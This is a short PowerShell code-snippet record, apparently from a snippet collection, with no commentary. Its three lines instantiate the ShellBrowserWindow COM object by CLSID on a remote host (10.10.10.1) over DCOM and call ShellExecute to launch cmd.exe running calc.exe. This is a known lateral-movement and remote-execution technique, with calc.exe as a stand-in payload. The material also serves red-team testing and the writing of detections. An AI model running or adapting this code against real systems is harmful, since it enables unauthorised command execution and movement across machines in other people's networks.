---
id: dc022d7e-d739-45de-b1fb-31ee06fb8806
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:07.185796+00:00'
updated_at: '2023-04-10T20:25:47.371207+00:00'
---

# Code Snippet dc022d7e

**Language**: ps1

```ps1
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"10.10.10.1")
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```
